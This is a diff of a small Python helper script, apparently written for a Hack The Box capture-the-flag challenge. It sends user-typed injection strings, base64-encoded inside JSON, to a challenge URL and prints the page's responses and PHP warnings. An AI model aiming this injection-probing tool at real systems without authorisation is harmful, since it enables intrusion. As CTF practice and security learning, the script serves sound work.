@@ -1,18 +1,21 @@
 import requests
 from base64 import b64encode
 import re
+#from bs4 import BeautifulSoup
 import json
 
 while True:
     injection_str = input("Enter string: ")
     payload = json.dumps({'ID': injection_str.strip()})
-    print(payload)
+    #print(payload)
     payloadb64=b64encode(payload.encode('utf-8')).decode('utf-8')
-    print(payloadb64)
+    #print(payloadb64)
     url = 'http://docker.hackthebox.eu:31024/index.php?obj=' + payloadb64
-    print(url)
+    #print(url)
     r = requests.get(url)
-    print(r.content)
-    #soup = BeautifulSoup(r.text, 'html.parser')
-    #body = r.text
-    #print("\n", body, "\n)")
+    #print(r.content)
+    response=re.findall('verdana\'>(.*)</h4>',r.text)
+    response2=re.findall("<b>Warning</b>:(.*)<b>",r.text)
+    print("Query: "+str(payload))
+    print("Response:"+str(response))
+    print("Warning: "+str(response2))
